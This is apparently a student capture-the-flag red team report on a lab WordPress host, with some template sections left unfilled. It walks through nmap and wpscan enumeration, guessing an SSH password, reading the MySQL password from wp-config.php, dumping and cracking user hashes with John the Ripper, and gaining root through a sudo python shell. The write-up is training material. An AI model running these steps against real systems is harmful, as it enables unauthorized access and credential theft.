# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services
_TODO: Fill out the information below._

Nmap scan results for each machine reveal the below services and OS details:

`$ nmap -sV 192.168.1.110`
  <img src="/Images/NMAP-scan.png">

This scan identifies the services below as potential points of entry:
**Target 1**
1. Port 22/TCP 	Open 	SSH
2. Port 80/TCP 	Open 	HTTP
3. Port 111/TCP 	Open 	rcpbind
4. Port 139/TCP 	Open 	netbios-ssn
5. Port 445/TCP 	Open 	netbios-ssn

_TODO: Fill out the list below. Include severity, and CVE numbers, if possible._
### Critical Vulnerabilities

The following vulnerabilities were identified on each target:
- Target 1
  - List of
  - Critical
  - Vulnerabilities

_TODO: Include vulnerability scan results to prove the identified vulnerabilities._

### Exploitation
_TODO: Fill out the details below. Include screenshots where possible._

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1.txt`: *b9bbcb33ellb80be759c4e844862482d*
    - **Exploit Used**
    - WPScan to enumerate users of the Target 1 WordPress site
    - Command: 
        - `$ wpscan --url http://192.168.1.110 --enumerate u`


<img src="/Images/wpscan-users.png">
<img src="/Images/flag1.png">

- Targeting user Michael
    - Brief manual Brute Force attack to guess/finds Michael’s password
    - User password was found upon attempting most basic username duplication as password credential.
    - Password: michael
- Capturing Flag 1: SSH in as Michael traversing through directories and files.
    - Flag 1 found in var/www/html folder at root in service.html in a HTML comment below the footer.
    - Commands:
        - `ssh michael@192.168.1.110`
        - `pw: michael`
        - `cd /var/www/html`
        - `ls -l`
        - `nano service.html`
  - `flag2.txt`: *fc3fd58dcdad9ab23faca6e9a3e581c*
    - **Exploit Used**
      - Same SSH exploit for user Michael leveraged in the 1st exploit
      - Simple directory exploration found the 'flag2.txt' file plainly visible in the /var/www/ directory.
      - `cd /var/www/`
      - `ls -l`
      - `cat flag2.txt`
<img src="/Images/flag2.png">

- **Flag3: afc01ab56b50591e7dccf93122770cd2**
- Exploit Used:
    - Viewing the wp-config.php file revealed both username and password for MySQL database access.
    - Captured credentials were used to access and investigate the database.
    - Flag 3 was found in wp_posts table in the wordpress database.
        - Commands:
            - `mysql -u root -p’R@v3nSecurity’ -h 127.0.0.1` 
            - `show databases;`
            - `use wordpress;` 
            - `show tables;`
            - `select * from wp_posts;`

<img src="/Images/flag3.png">


- **Flag4: 715dea6c055b9fe3337544932f2941ce**
- Exploit Used:
    - Unsalted password hash and the use of privilege escalation with Python.
    - Capturing Flag 4: Retrieve user credentials from database, crack password hash with John the Ripper and use Python to gain root privileges.
        - Once having gained access to the database credentials as Michael from the wp-config.php file, lifting username and password hashes using MySQL was next. 
        - These user credentials are stored toorin the wp_users table of the wordpress database. The usernames and password hashes were copied/saved to the Kali machine in a file called wp_hashes.txt.
            - Commands:
                - `mysql -u root -p’R@v3nSecurity’ -h 127.0.0.1` 
                - `show databases;`
                - `use wordpress;` 
                - `show tables;`
                - `select * from wp_users;`

        - <img src="/Images/mysql-users.png">

        - On the Kali local machine the wp_hashes.txt was run against John the Ripper to crack the hashes. 
            - Command:
                - `john wp_hashes.txt`

        - <img src="/Images/John-show.png">

      	  	- Once Steven’s password hash was cracked, the next thing to do was SSH as Steven. Then as Steven checking for privilege and escalating to root with Python
           		 - Commands: 
               			 - `ssh steven@192.168.1.110`
               			 - `pw:pink84`
               			 - `sudo -l`
               			 - `sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’`
                			- `cd /root`
               			 - `ls`
               			 - `cat flag4.txt`

		- Python Escalate
			- <img src="/Images/python-escalate.png">

- **FLAG 4**
<img src="/Images/flag4.png">